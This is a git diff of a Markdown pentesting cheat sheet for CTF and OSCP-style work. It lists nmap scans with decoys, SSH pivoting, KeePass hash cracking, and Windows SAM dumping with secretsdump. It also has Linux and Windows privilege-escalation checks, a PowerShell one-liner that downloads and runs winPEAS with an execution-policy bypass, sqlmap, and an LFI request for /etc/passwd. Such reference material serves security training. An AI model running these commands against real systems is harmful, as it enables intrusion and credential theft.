@@ -1,4 +1,3 @@
-# Enumeration-notes
 # Comprehensive Enumeration Notes
 
 ## **1. Network Enumeration**
@@ -20,11 +19,6 @@ nmap -A -T4 <target_ip>
 - `-A` : Enables OS detection, script scanning, and traceroute
 - `-T4` : Faster timing template
 
-#### **Specific Port Scan**
-```bash
-nmap -p 21,22,80,443 <target_ip>
-```
-
 #### **Firewall Evasion**
 ```bash
 nmap -f -D RND:5 <target_ip>
@@ -32,178 +26,126 @@ nmap -f -D RND:5 <target_ip>
 - `-f` : Fragment packets
 - `-D RND:5` : Use 5 random decoys
 
-### **1.2 Advanced Network Scanning**
-
-#### **Scanning for Live Hosts (Ping Sweep)**
-```bash
-nmap -sn 10.10.10.0/24
-```
-
-#### **Enumerating Open Ports**
-```bash
-nc -zv <target_ip> 1-65535
-```
-
-#### **Banner Grabbing**
-```bash
-nc -nv <target_ip> <port>
-```
-
-#### **SNMP Enumeration**
-```bash
-snmpwalk -c public -v1 <target_ip>
-```
-
-#### **SMB Enumeration**
+### **1.2 SMB Enumeration**
 ```bash
 smbmap -H <target_ip>
 enum4linux -a <target_ip>
+nmap --script smb-enum* -p 445 <target_ip>
 ```
 
 ---
 
-## **2. Web Enumeration**
+## **2. SSH Enumeration & Exploitation**
 
-### **2.1 Directory and File Enumeration**
-#### **Gobuster**
+### **2.1 Checking for SSH Keys**
 ```bash
-gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
+ls -la ~/.ssh/
+cat ~/.ssh/id_rsa
 ```
 
-#### **FFUF for Fuzzing**
+### **2.2 Generating SSH Keys**
 ```bash
+ssh-keygen -t rsa -b 4096 -f my_key
+```
+- `-t rsa` : Specifies RSA key
+- `-b 4096` : Bit length
+- `-f my_key` : Output file
+
+### **2.3 SSH Authentication**
+```bash
+ssh -i my_key user@<target_ip>
+```
+
+### **2.4 SSH Tunneling & Pivoting**
+#### **Port Forwarding (Local to Remote)**
+```bash
+ssh -L 8080:localhost:80 user@<target_ip>
+```
+- Forwards local 8080 to remote 80
+
+#### **Dynamic Proxy for Pivoting**
+```bash
+ssh -D 9050 user@<target_ip>
+proxychains nmap -sT -Pn -n -p- target_internal_ip
+```
+- `-D 9050` : SOCKS proxy
+- Use ProxyChains to route traffic
+
+---
+
+## **3. Web Enumeration**
+
+### **3.1 Directory and File Enumeration**
+```bash
+gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
 ffuf -u http://<target_ip>/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 ```
 
-#### **Nikto (Web Vulnerability Scanner)**
-```bash
-nikto -h http://<target_ip>
-```
-
-### **2.2 CMS Enumeration**
-#### **WordPress**
+### **3.2 CMS Enumeration**
 ```bash
 wpscan --url http://<target_ip> --enumerate u,p
 ```
-
 #### **Joomla**
 ```bash
-joomscan --url http://<target_ip>
+joomscan --url http://<target_ip> ```
+
+---
+
+## **4. Credential Dumping & Password Cracking**
+
+### **4.1 Keepass2 (.kdbx) File Extraction**
+```bash
+keepass2john myfile.kdbx > hash.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+```
+
+### **4.2 SAM & SYSTEM Dumping (Windows)**
+```powershell
+reg save HKLM\SAM sam.save
+reg save HKLM\SYSTEM system.save
+```
+```bash
+secretsdump.py -sam sam.save -system system.save LOCAL
 ```
 
 ---
 
-## **3. System Enumeration**
+## **5. Privilege Escalation**
 
-### **3.1 Linux Enumeration**
-#### **Check OS & Kernel Version**
+### **5.1 Linux Privilege Escalation**
 ```bash
-uname -a
-cat /etc/os-release
-```
-
-#### **Check SUID Binaries**
-```bash
+sudo -l
 find / -perm -4000 -type f 2>/dev/null
 ```
 
-#### **Checking Running Processes**
-```bash
-ps aux
-```
-
-### **3.2 Windows Enumeration**
-#### **Check User Privileges**
+### **5.2 Windows Privilege Escalation**
 ```powershell
 whoami /priv
-```
-
-#### **Find Stored Credentials**
-```powershell
-reg query HKLM /f "password" /t REG_SZ /s
+winpeas.exe
 ```
 
 ---
 
-## **4. Privilege Escalation**
+## **6. Automated Enumeration Tools**
 
-### **4.1 Linux PrivEsc**
-#### **Find Writable Folders**
-```bash
-find / -writable -type d 2>/dev/null
-```
-
-#### **Check Cron Jobs**
-```bash
-cat /etc/crontab
-```
-
-### **4.2 Windows PrivEsc**
-#### **Check Service Misconfigurations**
-```powershell
-Get-Service | Where-Object {$_.StartMode -eq "Auto"}
-```
-
-#### **Find Weak Permissions**
-```powershell
-icacls C:\Users\*
-```
-
----
-
-## **5. OSCP-Level Enumeration**
-
-### **5.1 Manual Enumeration**
-#### **Check for SSH Keys**
-```bash
-ls -la ~/.ssh/
-```
-
-#### **Find Writable Files**
-```bash
-find / -perm -2 -type f 2>/dev/null
-```
-
-### **5.2 Automated Enumeration Tools**
-#### **LinPEAS (Linux PrivEsc Script)**
+### **6.1 Linux PrivEsc**
 ```bash
 wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
 chmod +x linpeas.sh
 ./linpeas.sh
 ```
 
-#### **WinPEAS (Windows PrivEsc Script)**
+### **6.2 Windows PrivEsc**
 ```powershell
 powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat')"
 ```
 
-### **5.3 Exploiting Misconfigurations**
-#### **Sudo Exploit (Linux)**
-```bash
-sudo -l
-sudo /bin/bash
-```
-
-#### **Unquoted Service Path (Windows)**
-```powershell
-wmic service get name,displayname,pathname,startmode
-```
-
 ---
 
-## **6. Fuzzing Techniques**
-
-### **6.1 Burp Suite Intruder**
-- Load target URL
-- Identify the parameter
-- Use wordlist-based fuzzing
-
-### **6.2 SQL Injection Fuzzing**
+## **7. Fuzzing Techniques**
 ```bash
 sqlmap -u "http://<target_ip>/index.php?id=1" --dbs
 ```
-
-### **6.3 LFI/RFI Exploitation**
 ```bash
 curl http://<target_ip>/?file=../../../../etc/passwd
 ```
@@ -211,14 +153,5 @@ curl http://<target_ip>/?file=../../../../etc/passwd
 ---
 
 ## **Conclusion**
-This **detailed enumeration cheat sheet** covers all necessary commands, tools, and techniques required for **network, web, system enumeration, privilege escalation, and OSCP-level enumeration**. Use this as a **quick reference** while solving CTF challenges and real-world pentesting engagements!
-
----
-
-💡 **Tip:** Always document findings and outputs using:
-```bash
-tee enumeration_results.txt
-```
-
-🚀 Happy Hacking!
+This **detailed enumeration cheat sheet** covers all necessary commands, tools, and techniques required for **network, web, SSH, tunneling, Keepass2, system enumeration, privilege escalation, and OSCP-level enumeration**. 🚀 Happy Hacking!
 
